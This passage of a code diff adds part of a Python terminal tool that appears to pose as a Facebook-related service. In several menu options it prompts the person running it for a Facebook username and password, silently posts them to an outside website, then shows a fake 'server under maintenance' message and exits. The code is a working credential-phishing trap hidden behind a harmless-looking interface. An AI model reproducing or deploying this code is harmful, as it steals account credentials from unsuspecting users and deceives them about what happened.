+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (report=="2"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (report=="3"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (report=="4"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	else:
+		print(red + "Invalid input")
+		exit()
+
+else:
+	print(cyan + "Thanks for using...")
+	print(cyan + "Coded by  Indonesian_Hackers.org")
+	print(red + "Exiting...")
+	print("")
+	exit()
